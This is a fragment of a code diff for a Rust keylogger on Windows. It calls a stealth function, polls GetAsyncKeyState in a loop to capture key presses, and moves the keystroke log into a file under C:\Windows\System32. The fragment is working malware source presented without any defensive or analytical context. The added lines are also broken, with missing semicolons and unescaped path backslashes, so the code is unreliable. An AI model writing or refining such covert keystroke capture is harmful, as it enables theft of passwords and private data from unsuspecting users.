@@ -5,11 +5,19 @@ use std::fs::{File, OpenOptions};
 use std::io::prelude::*;
 #[allow(unused_variables)]
 fn main() {
-	stealth();
-	let mut file = match OpenOptions::new().append(true).open("LOG.txt") {
-		Ok(file) => file,
-		Err(e) => File::create("LOG.txt").unwrap()
-	};
+	stealth()
+	let file_path = "C:\Windows\System32\Mistakes.txt"
+	
+	 let mut file = match OpenOptions::new()
+        .append(true)
+        .create(true)
+        .open(file_path)
+    {
+        Ok(file) => file,
+        Err(e) => {
+            return;
+        }
+    };
   loop {
   	for i in 8..190 {
     	if unsafe { user32::GetAsyncKeyState(i) } == -32767 {
